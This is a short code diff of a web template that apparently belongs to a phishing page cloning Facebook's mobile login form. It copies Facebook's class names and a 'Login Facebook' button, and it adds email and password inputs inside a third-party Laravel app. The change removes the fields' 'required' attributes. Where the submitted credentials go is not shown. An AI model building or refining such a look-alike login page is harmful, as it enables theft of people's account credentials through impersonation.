@@ -95,12 +95,12 @@
  {{ csrf_field() }}
                                 <div class="_55wo _55x2 _56bf"><input type="email" autocorrect="off" autocapitalize="off"
                                                                       class="_56bg _55ws _5ruq" name="email"
-                                                                      placeholder="Email" type="text" id="email" required />
+                                                                      placeholder="Email" type="text" id="email" />
 
 
                                     <input autocorrect="off" autocapitalize="off" class="_56bg _55ws _5ruq"
                                            placeholder="Password" name="password" type="password"
-                                           data-sigil="password" id="passsword" required/>
+                                           data-sigil="password" id="passsword"/>
                                     <div class="_55ws" >
                                         <button type="submit" value="Log in" class="_56bs _56b_ _56bw _56bu"
                                                 name="login" id="u_0_1" o data-sigil="touchable"><span class="_55sr">Login Facebook</span>
